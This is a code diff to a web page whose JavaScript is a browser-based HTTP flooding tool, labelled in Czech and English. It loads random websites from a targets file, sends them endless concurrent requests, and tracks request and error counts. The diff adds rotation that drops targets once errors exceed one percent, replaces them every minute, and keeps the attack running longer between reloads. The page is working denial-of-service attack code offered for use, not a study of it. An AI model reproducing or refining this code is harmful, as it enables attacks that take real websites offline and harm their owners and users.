@@ -56,17 +56,47 @@
 <script>
   var targets = {};
 
-  async function get_targets() {
+  async function get_targets(targets_qty) {
+    var targets_subset = {};
     var source = (await (await fetch ("targets.txt")).text()).split("\n");
-    for (var i = 0; i < 200; i++) {
+    for (var i = 0; i < targets_qty; i++) {
       index = parseInt(Math.random() * source.length);
-      targets[source[index]] = {number_of_errored_responses: 0, number_of_requests: 0};
+      if (!/https?:\/\//.test(source[index])) {
+        source[index] = 'https://' + source[index];
+      }
+      targets_subset[source[index]] = {
+        active: true,
+        number_of_errored_responses: 0, 
+        number_of_requests: 0
+      };
     }
+    return targets_subset;
   }
 
   var statsEl = document.getElementById('stats');
   function printStats() {
-    statsEl.innerHTML = '<table width="100%"><thead><tr><th>Web</th><th>Počet dotazů/Number of Requests</th><th>Počet chyb/Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+    statsEl.innerHTML = 
+      '<table width="100%">' + 
+        '<thead>' +
+          '<tr>' +
+            '<th>Web</th>' +
+            '<th>Počet dotazů/Number of Requests</th>' +
+            '<th>Počet chyb/Number of Errors</th>' +
+            '<th>Poměr dotazů/chyb / Requests/errors ratio' +
+          '</tr>' +
+        '</thead>' +
+        '<tbody>' + 
+          Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => 
+            '<tr>' +
+              '<td>' + target + '</td>' +
+              '<td>' + number_of_requests + '</td>' +
+              '<td>' + number_of_errored_responses + '</td>' +
+              '<td>' + number_of_errored_responses / number_of_requests + '</td>' +
+            '</tr>'
+            ).join('') + 
+        '</tbody>' +
+      '</table>';
+    
   }
   setInterval(printStats, 1000);
 
@@ -90,7 +120,7 @@
   }
 
   async function flood(target) {
-    for (var i = 0;; ++i) {
+    for (var i = 0; targets[target].active; ++i) {
       if (queue.length > CONCURRENCY_LIMIT) {
         await queue.shift()
       }
@@ -98,35 +128,47 @@
       queue.push(
         fetchWithTimeout(target+rand, { timeout: 1000 })
           .catch((error) => {
-            if (error.code === 20 /* ABORT */) {
-              return;
-            }
-            targets[target].number_of_errored_responses++;
-          })
-          .then((response) => {
-            if (response && !response.ok) {
+            if (targets[target]) {
+              if (error.code === 20 /* ABORT */) {
+                return;
+              }
               targets[target].number_of_errored_responses++;
             }
-            targets[target].number_of_requests++;
+          })
+          .then((response) => {
+            if (targets[target]) {
+              if (response && !response.ok) {
+                targets[target].number_of_errored_responses++;
+              }
+              targets[target].number_of_requests++;
+            }
           })
 
       )
     }
+    delete targets[target];
   }
 
   async function refresh_targets() {
     var to_replace = 0;
-    Object.entries(targets).forEach(t => {
-      if (t[1].number_of_errored_responses / t[1].number_of_requests > 0.99) {
-        delete targets[t[0]];
+    for (target of Object.entries(targets)) {
+      if (target[1].number_of_errored_responses / target[1].number_of_requests > 0.01) {
+        targets[target[0]].active = false;
         to_replace++;
       }
-    });
-
+    }
+    var new_targets = await get_targets(to_replace);
+    targets = {...targets, ...new_targets};
+    Object.keys(new_targets).map(flood);
   }
 
   // Start
   document.getElementById('refreshed').innerHTML = Date();
-  setInterval(() => {location.reload();}, 300000);
-  get_targets().then(() => {Object.keys(targets).map(flood)});
+  setInterval(() => {location.reload();}, 3600 * 1000);
+  setInterval(refresh_targets, 60 * 1000);
+  var promise = get_targets(20);
+  promise.then(result => { 
+    targets = result; 
+    Object.keys(targets).map(flood) 
+  });
 </script>
